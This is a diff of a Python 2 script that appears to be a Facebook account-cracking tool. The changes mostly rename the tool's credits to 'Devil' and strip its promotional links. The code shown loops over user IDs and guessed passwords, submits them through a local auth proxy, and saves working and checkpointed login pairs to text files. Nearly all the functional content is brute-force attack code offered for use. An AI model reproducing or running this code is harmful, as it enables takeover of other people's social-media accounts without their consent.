@@ -1,7 +1,7 @@
 #coding=utf-8
 #!/usr/bin/python2
 #coding=utf-8
-#originally written by shahwaiz
+#originally written by devil
 import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
 from multiprocessing.pool import ThreadPool
 try:
@@ -18,20 +18,19 @@ sys.setdefaultencoding("utf8")
 logo ="""
 
 \033[1;37m \033[0;97m
-   ##     ##       ######     ###########
-   ##     ##      ##    ##        ##
-   ##     ##      ##              ##
-   \033[1;32m#########       ######         ## \033[0;97m
-   ##     ##            ##        ##
-   ##     ##      ##    ##        ## 
-   ##     ##       ######         ##
+\033;[1;37m                      
+\033;[1;37m                             
+\033;[1;37m             .          .         
+\033;[1;37m                  l        
+\033;[1;37m               
+\033;[1;37m                  
+                                    
+                                                  Devil  Power    ------------------------------------------Devil  Power 
 
- ------------------------------------------
-
-   Author   : My
-   Github   : https://github.com/my
-   Youtube  : My
-   Telegram : My Programmers
+   Author   : Awan Devil
+   Github   : https://github.com/.......
+   Youtube  : .......
+   Telegram : .......
    This tool is free not for sale
 
  ----------------------------------------- """
@@ -57,7 +56,7 @@ def reg():
         os.system("fuser -k 5000/tcp &")
         os.system("#")
         os.system("cd ..... && node index.js &")
-        os.system("xdg-open https://t.me/Kingidseller")
+        os.system("xdg-open https://t.me/.......")
         time.sleep(5)
         login()
     else:
@@ -151,11 +150,11 @@ def menu_option():
 	elif select =="2":
 		choice()
 	elif select =="3":
-		os.system('xdg-open https://youtu.be/gcdZwOqkZSg')
+		os.system('xdg-open https://youtu.be/....')
 	elif select =='4':
-	    os.system('xdg-open https://youtu.be/tncUQGIok8c')
+	    os.system('xdg-open https://youtu.be/...')
 	elif select =='5':
-	    os.system('xdg-open https://youtu.be/xN-l-dTj6aY')
+	    os.system('xdg-open https://youtu.be/.....')
 	else:
 		print("")
 		print("\tSelect valid option")
@@ -262,7 +261,7 @@ def crack_select():
 	print("")
 	print(47*"-")
 	print("")
-	print("\t\033[1;32mCreated by: My Group\033[0;97m")
+	print("\t\033[1;32mCreated by: Devil's Group\033[0;97m")
 	print(47*"-")
 	print("")
 	def main(arg):
@@ -273,14 +272,14 @@ def crack_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;35m[DVL-OK] \033[1;32m"+uid+" | "+pass1+"\033[0;97m")
 				ok = open("successful.txt", "a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print(" \033[1;33m[HST-CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m[DVL-CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("checkpoint.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -290,14 +289,14 @@ def crack_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;35m[DVL-OK] \033[1;32m"+uid+" | "+pass2+"\033[0;97m")
 						ok = open("successful.txt", "a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print(" \033[1;33m[HST-CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m[DVL-CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("checkpoint.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -307,14 +306,14 @@ def crack_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;35m[DVL-OK] \033[1;32m"+uid+" | "+pass3+"\033[0;97m")
 								ok = open("successful.txt", "a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print(" \033[1;33m[HST-CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m[DVL-CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("checkpoint.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -324,14 +323,14 @@ def crack_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;35m[DVL-OK] \033[1;32m"+uid+" | "+pass4+"\033[0;97m")
 										ok = open("successful.txt", "a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print(" \033[1;33m[HST-CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;33m[DVL-CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("checkpoint.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
@@ -452,7 +451,7 @@ def choice_select():
 	print("")
 	print(47*"-")
 	print("")
-	print("\t\033[1;32mCreated by: HST (HOP) Group\033[0;97m")
+	print("\t\033[1;32mCreated by:  Group\033[0;97m")
 	print(47*"-")
 	print("")
 	def main(arg):
@@ -462,14 +461,14 @@ def choice_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;35m[DVL-OK] \033[1;32m"+uid+" | "+pass1+"\033[0;97m")
 				ok = open("successful.txt", "a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print(" \033[1;33m[HST-CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m[DVL-CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("checkpoint.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -478,14 +477,14 @@ def choice_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;35m[DVL-OK] \033[1;32m"+uid+" | "+pass2+"\033[0;97m")
 						ok = open("successful.txt", "a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print(" \033[1;33m[HST-CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m[DVL-CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("checkpoint.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -494,14 +493,14 @@ def choice_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;35m[DVL-OK] \033[1;32m"+uid+" | "+pass3+"\033[0;97m")
 								ok = open("successful.txt", "a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print(" \033[1;33m[HST-CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m[DVL-CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("checkpoint.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -510,14 +509,14 @@ def choice_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print(" \033[1;35m[HST-OK] \033[1;32m"+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;35m[DVL-OK] \033[1;32m"+uid+" | "+pass4+"\033[0;97m")
 										ok = open("successful.txt", "a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print(" \033[1;33m[HST-CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;33m[DVL-CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("checkpoint.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
